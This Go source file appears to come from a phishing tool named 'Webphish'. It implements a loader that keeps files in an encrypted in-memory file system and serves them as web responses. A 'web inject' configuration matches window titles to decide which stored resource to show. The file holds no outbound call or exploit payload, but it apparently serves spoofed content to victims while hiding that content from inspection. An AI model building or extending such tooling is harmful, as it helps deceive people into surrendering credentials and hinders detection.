package loader

import (
	"Webphish/internal"
	"Webphish/internal/console"
	"Webphish/internal/edge"
	"Webphish/internal/resource"
	"encoding/xml"
	"fmt"
	box "github.com/capnspacehook/pandorasbox"
	"net/url"
	"path/filepath"
	"regexp"
	"strings"
)

func init() {
	box.InitGlobalBox()
}

type EncryptedVFSLoader struct {
	webInjectConfiguration resource.Configuration
}

func (loader *EncryptedVFSLoader) Get(uri string) edge.WebResponse {
	var parsed *url.URL
	var err error

	defaultResponse := edge.WebResponse{
		Content:      nil,
		StatusCode:   0,
		ReasonPhrase: "",
		Headers:      "",
	}
	if parsed, err = url.Parse(uri); err != nil {
		return defaultResponse
	}

	path := strings.TrimPrefix(parsed.Path, "/")
	path = fmt.Sprintf("%s%s", box.VFSPrefix, path)
	fileExt := filepath.Ext(path)
	contentType := edge.GetContentType(fileExt)
	fileContent, err := box.ReadFile(path)
	if err != nil {
		console.MessageBoxPlain("Error", fmt.Sprintf("error while reading file: %v", err))
		return defaultResponse
	}

	return edge.OK(fileContent, contentType)
}

func (loader *EncryptedVFSLoader) HasMatchingResources(title string) bool {
	_, found := loader.MatchingResource(title)
	return found == internal.GenericSuccess
}

func (loader *EncryptedVFSLoader) MatchingResource(title string) (string, internal.ErrorCode) {
	for _, matcher := range loader.webInjectConfiguration.ResourceMatchers {
		matched, _ := regexp.MatchString(matcher.Name, title)
		if matched {
			return matcher.MatchingResourcePath, internal.GenericSuccess
		}
	}
	return "", internal.GenericError
}

func (loader *EncryptedVFSLoader) Put(file *resource.File) internal.ErrorCode {
	if file.Path == "conf.xml" {
		err := xml.Unmarshal(file.Content, &loader.webInjectConfiguration)
		if err != nil {
			return internal.ERR_LOADER_LOAD_CONFIGURATION
		}
		return internal.GenericSuccess
	}

	path := fmt.Sprintf("%s%s", box.VFSPrefix, file.Path)
	if file.IsDirectory {
		box.MkdirAll(path, 0644)
		return internal.GenericSuccess
	}
	err := box.WriteFile(path, file.Content, 0644)
	if err != nil {
		return internal.ERR_LOADER_PUT_FILE
	}
	return internal.GenericSuccess
}
